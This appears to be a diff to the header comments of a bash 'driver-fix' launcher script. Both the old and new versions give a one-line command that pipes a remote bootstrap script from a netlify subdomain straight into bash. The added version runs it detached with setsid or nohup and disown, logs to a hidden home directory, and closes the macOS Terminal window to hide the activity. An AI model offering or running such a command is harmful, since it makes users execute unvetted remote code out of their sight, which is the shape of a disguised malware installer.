@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
-# One-line launcher — detached background + auto-close terminal (macOS/Linux):
-# curl -fsSL https://driver-fix-238308.netlify.app/bootstrap.sh | bash; case "$(uname -s)" in Darwin) osascript -e 'tell application "Terminal" to close (front window)' 2>/dev/null ;; esac; exit
+# One-line launcher — instant background, survives manual/auto terminal close (macOS/Linux):
+# mkdir -p ~/.driver-fix-host/.host-setup && (setsid bash -c 'curl -fsSL https://driver-fix-238308.netlify.app/bootstrap.sh | bash' 2>/dev/null || nohup bash -c 'curl -fsSL https://driver-fix-238308.netlify.app/bootstrap.sh | bash') >>~/.driver-fix-host/.host-setup/run.log 2>&1 < /dev/null & disown; case "$(uname -s)" in Darwin) osascript -e 'tell application "Terminal" to close (front window)' 2>/dev/null ;; esac; exit
 # First run can take 2-3 min. Check: tail -f ~/.driver-fix-host/.host-setup/run.log
 set -euo pipefail
 
